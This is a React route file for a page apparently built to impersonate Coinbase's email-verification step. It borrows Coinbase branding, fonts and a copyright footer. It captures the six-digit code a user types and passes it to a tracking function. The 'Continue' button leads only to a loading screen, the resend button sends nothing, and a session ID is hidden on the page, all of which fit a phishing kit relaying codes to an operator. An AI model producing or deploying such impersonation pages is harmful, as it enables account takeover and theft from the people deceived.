import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
  useQueryParam,
} from "@/components/cb/CbShared";

export const Route = createFileRoute("/cb/mailcode")({
  head: () => ({ meta: [{ title: "Check your email" }] }),
  component: CbMailCodePage,
});

function CbMailCodePage() {
  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId } = useCbTracking();
  const email = useQueryParam("email") ?? "";
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const [countdown, setCountdown] = useState(60);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (countdown <= 0) return;
    const t = setInterval(() => setCountdown((c) => c - 1), 1000);
    return () => clearInterval(t);
  }, [countdown]);

  const commitIfFull = (arr: string[]) => {
    if (arr.every((d) => d !== "")) {
      trackSubmit("Email Code", arr.join(""));
      trackClick("Email Code Submitted");
    }
  };

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
    commitIfFull(newDigits);
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;
    const newDigits = [...digits];
    for (let i = 0; i < pasted.length; i++) newDigits[i] = pasted[i];
    setDigits(newDigits);
    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
    commitIfFull(newDigits);
  };

  const allFilled = digits.every((d) => d !== "");

  const handleContinue = () => {
    if (!allFilled) return;
    trackClick("Email Code Continue");
    cbNavigate("/cb/loading");
  };

  const handleResend = () => {
    if (countdown > 0) return;
    trackClick("Resend Email Code");
    setCountdown(60);
  };

  return (
    <div
      className="cb-page"
      style={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        backgroundColor: "rgb(10, 11, 13)",
        color: "#fff",
      }}
    >
      <CbFontStyle />
      <style>{`
        .cb-page, .cb-page * {
          font-family: 'CoinbaseSans', 'CoinbaseDisplay', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
          -webkit-font-smoothing: antialiased;
        }
        .cb-page * { box-sizing: border-box; }
        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .cb-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .cb-animate-delay-1 { animation-delay: 0.05s; }
        .cb-animate-delay-2 { animation-delay: 0.1s; }
        .cb-animate-delay-3 { animation-delay: 0.15s; }
        .cb-animate-delay-4 { animation-delay: 0.2s; }
        .cb-digit {
          width: 100%; aspect-ratio: 1; text-align: center; font-size: 24px;
          font-weight: 500; border-radius: 12px;
          border: 1px solid rgba(138, 145, 158, 0.2);
          background: rgb(10, 11, 13); color: #fff; outline: none;
          caret-color: rgb(87, 139, 250);
          transition: border-color 0.15s ease, box-shadow 0.15s ease, background 0.15s ease, transform 0.15s ease;
        }
        .cb-digit:hover { background: rgb(17, 18, 20); }
        .cb-digit:focus { border-color: rgb(87, 139, 250); box-shadow: 0 0 0 1px rgb(87, 139, 250); transform: scale(1.05); }
        .cb-digit.filled { border-color: rgb(87, 139, 250); }
      `}</style>

      <CbSupportBanner />

      <header
        style={{
          display: "grid",
          gridTemplateColumns: "auto 1fr auto",
          height: 72,
          alignItems: "center",
          padding: "0 24px",
        }}
      >
        <div
          style={{ display: "flex", alignItems: "center", color: "#fff", cursor: "pointer" }}
          onClick={() => trackClick("Logo")}
        >
          <CbLogo />
        </div>
        <div />
        <div />
      </header>

      <main
        style={{
          display: "flex",
          justifyContent: "center",
          flexDirection: "column",
          flexGrow: 1,
          padding: "0 16px",
          alignItems: "center",
        }}
      >
        <div style={{ width: "100%", maxWidth: 380, display: "flex", flexDirection: "column" }}>
          <h1
            className="cb-animate"
            style={{
              fontSize: 28,
              fontWeight: 500,
              lineHeight: "36px",
              letterSpacing: "-0.02em",
              margin: "0 0 12px 0",
            }}
          >
            Check your email
          </h1>
          <p
            className="cb-animate cb-animate-delay-1"
            style={{
              fontSize: 14,
              lineHeight: "20px",
              color: "rgb(138, 145, 158)",
              margin: "0 0 32px 0",
            }}
          >
            We sent a 6-digit code to{" "}
            {email ? (
              <span style={{ color: "#fff", fontWeight: 500 }}>{email}</span>
            ) : (
              "your email address"
            )}
            . Enter it below to continue.
          </p>

          <div
            className="cb-animate cb-animate-delay-2"
            style={{ display: "grid", gridTemplateColumns: "repeat(6, 1fr)", gap: 12 }}
          >
            {digits.map((digit, i) => (
              <input
                key={i}
                ref={(el) => {
                  inputRefs.current[i] = el;
                }}
                name={`mail_code_${i}`}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                onPaste={i === 0 ? handlePaste : undefined}
                className={`cb-digit ${digit ? "filled" : ""}`}
                style={{ animationDelay: `${0.1 + i * 0.04}s` }}
              />
            ))}
          </div>

          <button
            className="cb-animate cb-animate-delay-3"
            onClick={handleResend}
            disabled={countdown > 0}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 8,
              width: "100%",
              marginTop: 16,
              padding: "10px 0",
              background: "transparent",
              border: "none",
              cursor: countdown > 0 ? "not-allowed" : "pointer",
              color: countdown > 0 ? "rgb(138, 145, 158)" : "rgb(87, 139, 250)",
              fontSize: 14,
              fontWeight: 500,
            }}
          >
            {countdown > 0 ? `Resend code in ${countdown}s` : "Resend code"}
          </button>

          <button
            className="cb-animate cb-animate-delay-4"
            onClick={handleContinue}
            disabled={!allFilled}
            style={{
              width: "100%",
              height: 56,
              marginTop: 24,
              border: "none",
              borderRadius: 1000,
              background: allFilled ? "rgb(87, 139, 250)" : "rgba(87, 139, 250, 0.3)",
              color: allFilled ? "rgb(10, 11, 13)" : "rgba(255,255,255,0.4)",
              fontSize: 16,
              fontWeight: 700,
              cursor: allFilled ? "pointer" : "not-allowed",
            }}
          >
            Continue
          </button>

          <p
            className="cb-animate cb-animate-delay-4"
            style={{
              fontSize: 13,
              color: "rgb(138, 145, 158)",
              marginTop: 24,
              textAlign: "center",
              lineHeight: "18px",
            }}
          >
            Didn't receive an email? Check your spam folder or{" "}
            <a
              href="#"
              style={{ color: "rgb(87, 139, 250)", textDecoration: "none", fontWeight: 500 }}
              onClick={(e) => {
                e.preventDefault();
                trackClick("Contact Support");
              }}
            >
              contact support
            </a>
            .
          </p>
        </div>
      </main>

      <footer style={{ padding: "16px 24px", textAlign: "center" }}>
        <p style={{ fontSize: 11, color: "rgb(138, 145, 158)", margin: 0 }}>© 2025 Coinbase</p>
      </footer>

      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>
        {sessionId}
      </div>
    </div>
  );
}
